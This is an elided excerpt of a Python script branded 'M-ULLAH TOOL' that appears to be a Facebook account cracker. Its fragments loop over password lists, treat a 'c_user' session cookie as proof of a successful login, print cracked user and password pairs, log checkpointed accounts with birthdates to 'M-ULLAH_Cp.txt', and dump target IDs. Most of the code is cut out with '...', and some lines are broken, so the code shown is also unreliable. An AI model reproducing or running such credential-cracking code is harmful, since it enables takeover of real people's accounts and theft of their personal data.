...
def main():
    ...
    if Adi in ('0', '00'):
        ...
        exit('THANKS FOR USING M-ULLAH TOOL')  
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mM-ULLAH\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				print('\r\033[1;37m[\033[1;32mM-ULLAH-OK🔥\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				...
				print('\r\033[1;31m[\033[1;30mM-ULLAH-CP😔\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mM-ULLAH\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[M-ULLAH-CP😔] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))

					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))

					cp.append(wrt)

					open('M-ULLAH_Cp.txt','a').write('%s\n' % wrt)
				...
				print('\r\033[1;91m[M-ULLAH-CP😔] %s | %s%s      ' % (user,pw,tahun(user)))
...
def create_file():
    ...
    for ids in fileidopen:
        ...
        try:
            ...
            print('\033[1;97m [\033[1;32mM-ULLAH\033[1;37m] \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
...
banner = """
  ...
  \033[1;97m__  __   _   _ _    _      _   _  _ 

  \033[1;94m|  \/  | | | | | |  | |    /_\ | || |

  \033[1;95m| |\/| | | |_| | |__| |__ / _ \| __ |

  \033[1;33m|_|  |_|  \___/|____|____/_/ \_\_||_|

                \033[1;95m|−−−−−−−−−−−−−−−−−−−−−−−∣

                 \033[1;92m𝐌.𝐔𝐋𝐋𝐀𝐇--\033[1;395m𝐌𝐀𝐒𝐓𝐄𝐑--\033[1;3933m𝐌𝐈𝐍𝐃
...
\033[1;32m│\033[1;31m➣\033[1;37m VERSION \033[1;31m:\033[1;32m 2.2 │\033[1;37m.DO SUPPORT    • \033[1;36m \033[1;31m= \033[1;36m       \033[1;37m•   \033[1;32m│
